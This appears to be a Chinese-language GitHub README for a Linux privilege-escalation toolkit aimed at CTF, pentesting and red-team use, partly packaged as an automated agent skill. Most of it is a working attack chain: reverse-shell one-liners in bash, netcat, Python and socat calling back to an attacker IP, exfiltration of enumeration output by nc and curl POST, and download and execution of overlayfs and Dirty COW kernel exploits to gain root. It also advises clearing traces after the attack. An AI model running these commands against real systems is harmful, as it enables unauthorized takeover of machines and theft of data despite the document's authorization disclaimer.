# 🐧 linux-privesc-linpeas

> 端到端 Linux 提权辅助工具集 — 适用于渗透测试、CTF 夺旗、红队评估

[![GitHub](https://img.shields.io/badge/GitHub-mcc0624%2Flinux--privesc--linpeas-blue)](https://github.com/mcc0624/linux-privesc-linpeas)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
![Platform](https://img.shields.io/badge/platform-Linux-lightgrey)

---

## 📋 概述

自动化 Linux 提权工作流，覆盖从**反弹 shell 接收 → 信息收集 → 漏洞分析 → exploit 执行 → 提权成功**全链路：

```
目标反弹 shell
       ↓
  ┌─ 接收 shell (6767) ───────────────────┐
  │  socat / nc 监听                       │
  └──────────────┬────────────────────────┘
                 ↓
  ┌─ 资产枚举 ────────────────────────────┐
  │  linPEAS 自动上传并执行                │
  │  linux-exploit-suggester 辅助验证      │
  └──────────────┬────────────────────────┘
                 ↓
  ┌─ 结果分析 ────────────────────────────┐
  │  提取 CVE / SUID / sudo / cron / 密码  │
  │  匹配内核版本可用 exploit               │
  └──────────────┬────────────────────────┘
                 ↓
  ┌─ CVE 测试 & 提权 ────────────────────┐
  │  overlayfs (CVE-2015-1328)           │
  │  Dirty COW (CVE-2016-5195)           │
  │  更多 CVE 按优先级顺序测试             │
  └──────────────┬────────────────────────┘
                 ↓
  ┌─ 交付 ───────────────────────────────┐
  │  root shell → 指定监听端口            │
  │  PoC 代码 + 使用说明                  │
  └──────────────────────────────────────┘
```

---

## 🎯 适用场景

| 场景 | 说明 |
|------|------|
| 🏴 **CTF / VulnHub** | 快速提权，拿 flag |
| 🔴 **红队 / 渗透测试** | 内网 Linux 机器横向后的提权阶段 |
| 🧪 **实验室练习** | 系统性学习 Linux 提权技术 |
| 📚 **教学演示** | 展示完整的提权攻击链 |

---

## 🚀 快速开始

### 环境要求（本机 — Kali / 攻击机）

```bash
# 依赖检查
which socat nc python3 curl wget tmux gcc 2>/dev/null || echo "安装缺失组件"

# 一键部署
bash <(curl -sL https://raw.githubusercontent.com/mcc0624/linux-privesc-linpeas/main/scripts/setup_listener.sh)
```

### 手动部署

```bash
# 1. 下载 linPEAS
curl -L -o /tmp/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x /tmp/linpeas.sh

# 2. 下载 exploit 探测脚本
curl -sL -o /tmp/linux-exploit-suggester.sh \
  https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x /tmp/linux-exploit-suggester.sh

# 3. 下载常用 exploit 源码
curl -sL -o /tmp/ofs.c https://www.exploit-db.com/raw/37292          # CVE-2015-1328
curl -sL -o /tmp/dirtycow.c https://www.exploit-db.com/raw/40839     # CVE-2016-5195

# 4. 启动 HTTP 文件服务
cd /tmp && python3 -m http.server 8888 &

# 5. 启动反弹 shell 监听
socat TCP-LISTEN:6767,fork,reuseaddr -

# 备用: 使用 tmux 管理会话
tmux new-session -d -s revshell
tmux send-keys -t revshell "socat TCP-LISTEN:6767,fork,reuseaddr -" Enter
tmux attach -t revshell
```

---

## 📦 文件结构

```
linux-privesc-linpeas/
├── SKILL.md                          # OpenClaw 技能定义（自动触发工作流）
├── README.md                         # 本文件
├── scripts/
│   ├── setup_listener.sh             # 一键部署监听 + HTTP + 工具下载
│   ├── recv_post.py                  # HTTP POST 文件接收器（目标→本机）
│   └── analyze_peas.py               # linPEAS 输出自动分析器
└── references/
    └── CVE_QUICK_REF.md              # Linux 提权 CVE 速查表
```

---

## 📖 详细使用指南

### 第1步：获取反弹 shell

目标机上执行（任选其一）:

```bash
# Bash
bash -i >& /dev/tcp/<攻击机IP>/6767 0>&1

# Netcat（支持 -e）
nc -e /bin/bash <攻击机IP> 6767

# Netcat（无 -e）
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <攻击机IP> 6767 >/tmp/f

# Python
python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<攻击机IP>",6767))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'

# Socat
socat TCP:<攻击机IP>:6767 EXEC:/bin/bash
```

### 第2步：上传 linPEAS

```bash
# 目标机上下载执行
wget -q http://<攻击机IP>:8888/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
./linpeas.sh | tee /tmp/peas-out.txt
```

### 第3步：获取分析结果

```bash
# 方法1 — Netcat 传输（推荐）
# 本机：
nc -lvp 9996 > /tmp/target_peas.txt &
# 目标机：
nc <攻击机IP> 9996 < /tmp/peas-out.txt

# 方法2 — HTTP POST
# 本机（另一个终端）：
python3 recv_post.py 9997 /tmp/target_peas.txt
# 目标机：
curl -X POST --data-binary @/tmp/peas-out.txt http://<攻击机IP>:9997/upload
```

### 第4步：分析结果

```bash
# 使用分析脚本
python3 scripts/analyze_peas.py /tmp/target_peas.txt
```

或者手动关注以下信息：

| 🔍 关注点 | 🛠 命令 |
|-----------|---------|
| 内核版本 | `uname -a` |
| 发行版 | `cat /etc/os-release` |
| CVE 列表 | `grep -iE 'CVE-[0-9]{4}' /tmp/peas-out.txt` |
| SUID 文件 | `find / -perm -4000 -type f 2>/dev/null` |
| sudo 配置 | `sudo -l` |
| cron 任务 | `ls -la /etc/cron*` |
| 可写 passwd | `ls -la /etc/passwd /etc/shadow` |
| MySQL 空密码 | `mysql -u root -e 'select version()'` |

### 第5步：提权利用

#### overlayfs (CVE-2015-1328) — ⭐ 最稳定

```bash
# 目标机
wget -q http://<攻击机IP>:8888/ofs.c -O /tmp/ofs.c
gcc /tmp/ofs.c -o /tmp/ofs
/tmp/ofs
id   # → uid=0(root) ✅
```

适用于：Ubuntu 12.04/14.04，内核 3.13.0-3.19.0

#### Dirty COW (CVE-2016-5195) — ⭐ 最通用

```bash
# 目标机
wget -q http://<攻击机IP>:8888/dirtycow.c -O /tmp/dirty.c
gcc -pthread /tmp/dirty.c -o /tmp/dirty -lcrypt
/tmp/dirty mynewpass
su firefart  # 密码: mynewpass
id   # → uid=0(root) ✅

# 清理
cp /tmp/passwd.bak /etc/passwd
```

适用于：内核 2.6.22-4.8.3，几乎所有主流 Linux 发行版

### 第6步：接收 root shell

提权后反弹 root shell：

```bash
# 本机（另一个终端）:
nc -lvnp 8989

# 目标机（提权后）:
bash -i >& /dev/tcp/<攻击机IP>/8989 0>&1

# 或使用 Python 通用方式:
python -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<攻击机IP>",8989))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'
```

---

## 🛠 辅助脚本说明

### `setup_listener.sh` — 一键部署

```bash
chmod +x setup_listener.sh
./setup_listener.sh [监听端口] [HTTP端口] [反转shell端口]
# 默认: 6767 8888 8989
```

自动完成：
- 下载 linPEAS、exploit-suggester、CVE exploit 源码
- 启动 tmux socat 监听
- 启动 HTTP 文件服务
- 打印目标机可用文件清单

### `analyze_peas.py` — 自动分析

```bash
python3 analyze_peas.py /tmp/peas-output.txt
```

提取信息：
- 内核版本 / OS 发行版
- 所有匹配的 CVE 编号
- SUID / SGID 文件
- sudo 权限配置
- cron 定时任务
- 可写路径
- 敏感信息（密码、密钥、MySQL）

### `recv_post.py` — 文件接收

```bash
python3 recv_post.py [端口] [输出路径]
# 默认: 9997 /tmp/recv_file.txt
```

收到一次 POST 后自动退出。

---

## ⚠️ 安全声明

1. **仅用于合法授权测试。** 未经授权的使用可能违反法律。
2. **备份重要数据。** 某些 exploit 可能导致系统不稳定或数据丢失。
3. **清理痕迹。** 提权成功后及时清理临时文件（参考 `references/CVE_QUICK_REF.md` 的清理命令）。
4. **了解后果。** 在真实生产环境中使用前，确保已获得书面授权。

---

## 📚 技术参考

| 资源 | 链接 |
|------|------|
| linPEAS / PEASS-ng | https://github.com/peass-ng/PEASS-ng |
| Linux Exploit Suggester | https://github.com/mzet-/linux-exploit-suggester |
| HackTricks Linux PrivEsc | https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html |
| Exploit Database | https://www.exploit-db.com |
| CVE-2015-1328 详情 | https://nvd.nist.gov/vuln/detail/CVE-2015-1328 |
| CVE-2016-5195 详情 | https://nvd.nist.gov/vuln/detail/CVE-2016-5195 |

---

## 📄 License

[MIT](LICENSE)

---

**刚打下一台机器？下一步就该提权了。这工具帮你少敲几个命令。**
